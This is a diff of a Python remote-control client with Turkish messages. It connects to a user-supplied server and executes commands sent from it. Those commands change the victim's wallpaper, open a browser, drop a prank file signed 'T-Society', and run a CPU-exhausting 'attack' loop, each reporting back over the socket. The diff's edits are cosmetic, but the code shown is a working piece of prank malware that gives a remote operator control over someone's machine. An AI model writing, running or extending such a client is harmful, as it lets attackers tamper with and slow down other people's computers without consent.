@@ -27,7 +27,7 @@ def arkaplan_degistir(url):
             ctypes.windll.user32.SystemParametersInfoW(20, 0, yol, 3)
         elif cihaz == "Linux PC":
             os.system("gsettings set org.gnome.desktop.background picture-uri file://$PWD/arkaplan.jpg")
-            s.send("[✓] Arka plan degistirildi\n".encode())
+        s.send("[✓] Arka plan degistirildi\n".encode())
     except:
         s.send("[!] Arka plan degistirilemedi\n".encode())
 
@@ -47,19 +47,20 @@ def google_ac():
         os.system("start https://www.google.com")
     elif cihaz == "Linux PC":
         os.system("xdg-open https://www.google.com")
-    s.send(b"[✓] Google acildi\n")
+    s.send("[✓] Google acildi\n".encode())
 
 def dosya_olustur():
     with open("saka.txt", "w") as f:
         f.write("T-Society buradaydı!")
-    s.send(b"[+] Dosya olusturuldu\n")
+    s.send("[+] Dosya olusturuldu\n".encode())
 
 def saldiri_yap():
     for _ in range(9999999):
         _ = 9 ** 999
-    s.send(b"[✓] Cihaz kasarildi\n")
+    s.send("[✓] Cihaz kasarildi\n".encode())
 
 # === BAĞLANTI ===
+
 cihaz = cihaz_tipi()
 SERVER_IP = input("Server IP gir: ")
 PORT = int(input("Port gir: "))
@@ -73,6 +74,7 @@ except:
     exit()
 
 # === KOMUT DÖNGÜSÜ ===
+
 while True:
     try:
         komut = s.recv(1024).decode().strip()
@@ -92,6 +94,6 @@ while True:
             s.close()
             break
         else:
-            s.send(b"[!] Bilinmeyen komut\n")
+            s.send("[!] Bilinmeyen komut\n".encode())
     except:
         break
